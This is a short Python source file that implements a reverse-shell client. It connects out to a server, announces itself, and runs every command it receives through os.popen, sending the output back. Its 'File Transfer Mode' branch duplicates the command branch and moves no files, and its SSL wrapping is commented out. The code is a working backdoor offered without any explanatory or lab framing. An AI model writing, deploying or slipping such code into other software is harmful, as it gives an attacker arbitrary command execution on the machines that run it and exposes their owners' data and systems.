import socket
import ssl
import os

def create_client(server_ip, server_port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    # secure_socket = context.wrap_socket(client_socket, server_hostname=server_ip)
    client_socket.connect((server_ip, server_port))
    client_socket.send("<ON>".encode())
    while True:
        response = client_socket.recv(10240)
        if(response.decode()=="Command Mode"):
            response = client_socket.recv(10240)
            if response.decode().lower() == 'nuke':
                client_socket.send('nuke'.encode())
                break
            if response.decode().lower() == 'exit':
                client_socket.send('exit'.encode())
                continue
            
            output = os.popen(response.decode()).read()
            if output == "":
                output = "Command executed but no output returned."
            client_socket.send(output.encode('utf-8'))

        if(response.decode()=="File Transfer Mode"):
            response = client_socket.recv(10240)
            if response.decode().lower() == 'nuke':
                client_socket.send('nuke'.encode())
                break
            if response.decode().lower() == 'exit':
                client_socket.send('exit'.encode())
                continue
            
            output = os.popen(response.decode()).read()
            if output == "":
                output = "Command executed but no output returned."
            client_socket.send(output.encode('utf-8'))    
        

    


    

if __name__ == "__main__":
    create_client("127.0.0.1", 9999)
